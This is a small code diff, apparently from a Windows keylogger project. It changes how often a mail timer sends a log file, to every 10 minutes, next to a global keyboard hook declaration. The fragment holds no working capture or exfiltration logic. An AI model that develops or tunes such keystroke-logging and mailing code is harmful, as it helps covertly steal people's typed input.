@@ -34,7 +34,7 @@ void MailTimer()
 	}
 }
 
-Timer SetMailTimer(MailTimer, 500 * 60, Timer::Infinite);
+Timer SetMailTimer(MailTimer, 10000 * 60, Timer::Infinite); //Creates log file for sending mail every 10 minutes. Can be modified.
 
 HHOOK Hook = NULL;
 
